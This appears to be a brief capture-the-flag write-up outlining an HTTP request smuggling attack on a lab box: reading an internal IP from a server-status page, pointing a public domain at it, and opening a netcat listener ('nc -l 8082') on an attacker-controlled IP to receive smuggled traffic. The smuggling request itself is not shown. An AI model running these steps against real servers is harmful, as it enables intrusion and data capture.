1. Goto server-status endpoint and get the interal ip address 
2. Make a public address to point to this internal ip address (in my case it is: htb.droidkitchen.com)
3. Start somewhere that you have a real ip address a netcat server nc -l 8082
4. Than Use the following HTTP Smuggling request (it has inlined 94.155.225.9:8082 it should be changed to you real ip address with the nc tcp server)
